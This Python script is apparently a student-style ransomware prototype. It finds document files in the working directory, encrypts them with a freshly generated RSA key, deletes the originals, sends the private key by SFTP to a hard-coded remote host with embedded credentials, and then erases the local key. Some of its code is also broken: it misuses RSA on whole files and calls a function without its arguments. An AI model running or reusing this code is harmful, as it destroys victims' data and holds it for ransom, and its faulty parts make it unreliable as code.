import os
import paramiko
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Function to list files with specific extensions in the current directory and return their names in an array
def list_files_in_current_directory(extensions):
    current_directory = os.getcwd()
    file_names = []
    for root, _, files in os.walk(current_directory):
        for file in files:
            file_extension = os.path.splitext(file)[-1].lower()
            
            if file_extension in extensions:
                file_names.append(file)
    
    return file_names

# Replace the extensions in the list with the ones you're interested in (e.g., ['.pdf', '.txt']).
file_extensions = ['.pdf', '.txt', '.doc', '.docx', '.xls']

file_names_list = list_files_in_current_directory(file_extensions)

# Generating RSA Key Pair

def generate_rsa_key_pair(private_key_path, public_key_path):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )

    # Serialize and save the private key
    with open(private_key_path, "wb") as private_key_file:
        private_key_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )
        private_key_file.write(private_key_pem)

    # Serialize and save the public key
    public_key = private_key.public_key()
    with open(public_key_path, "wb") as public_key_file:
        public_key_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        public_key_file.write(public_key_pem)

# Specify paths for the private and public key files
private_key_path = "private_key.pem"
public_key_path = "public_key.pem"

generate_rsa_key_pair(private_key_path, public_key_path)

def encrypt_file(input_file_path, output_file_path, public_key_path):
    with open(public_key_path, "rb") as public_key_file:
        public_key = serialization.load_pem_public_key(public_key_file.read(), backend=default_backend())

    with open(input_file_path, "rb") as file_to_encrypt:
        plaintext = file_to_encrypt.read()

    ciphertext = public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(output_file_path, "wb") as encrypted_file:
        encrypted_file.write(ciphertext)

def decrypt_file(input_file_path, output_file_path, private_key_path):
    with open(private_key_path, "rb") as private_key_file:
        private_key = serialization.load_pem_private_key(private_key_file.read(), password=None, backend=default_backend())

    with open(input_file_path, "rb") as file_to_decrypt:
        ciphertext = file_to_decrypt.read()

    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(output_file_path, "wb") as decrypted_file:
        decrypted_file.write(plaintext)


print(file_names_list)


# Encrypt each file in the list
for input_file in file_names_list:
    output_file = f"encrypted_{input_file}"
    encrypt_file(input_file, output_file, public_key_path)
    print(f"Encrypted {input_file} and saved as {output_file}")


# Function to delete the original files
def delete_original_files(file_names):
    for file_name in file_names:
        file_path = os.path.join(os.getcwd(), file_name)
        os.remove(file_path)  # Delete the original file

delete_original_files(file_names_list)

def create_text_file_with_content(file_name, content):
    with open(file_name, 'w') as file:
        file.write(content)

# Usage:
file_name = "greeting.txt"
content = "Hey, how are you?"

create_text_file_with_content()

def transfer_private_key(machine1_host, machine1_port, machine1_username, machine1_password):
    try:
        # Create an SSH client instance
        ssh = paramiko.SSHClient()

        # Automatically add the server's host key (unsafe for production use)
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to Machine 1 using SSH with a username and password
        ssh.connect(machine1_host, port=machine1_port, username=machine1_username, password=machine1_password)

        # Create an SFTP session for file transfer
        sftp = ssh.open_sftp()

        # Upload the local file to the remote directory
        sftp.put(private_key_path, remote_directory + '/' + private_key_path)

        print(f"File '{private_key_path}' uploaded to Machine 1 in the '{remote_directory}' directory.")

    except Exception as e:
        print(f"Error: {e}")

    finally:
        # Close the SFTP and SSH connections
        sftp.close()
        ssh.close()

# Configuration for Machine 1 (the remote server)
machine1_host = '192.168.1.102'  # Replace with the IP address or hostname of Machine 1
machine1_port = 22  # Default SSH port is 22
machine1_username = 'bido'  # Replace with your username on Machine 1
machine1_password = '1928'  # Replace with your password on Machine 1

# Configuration for the file transfer
remote_directory = '/'  # Replace with the remote directory path on Machine 1

transfer_private_key(machine1_host, machine1_port, machine1_username, machine1_password)

def remove_private_key(file_to_delete):
    
    try:
        # Check if the file exists in the current directory
        if os.path.exists(file_to_delete):
            # Delete the file
            os.remove(file_to_delete)
            print(f"File '{file_to_delete}' has been deleted and transfered.")
        else:
            print(f"File '{file_to_delete}' does not exist in the current directory.")
    except Exception as e:
        print(f"Error deleting file: {e}")

remove_private_key(private_key_path)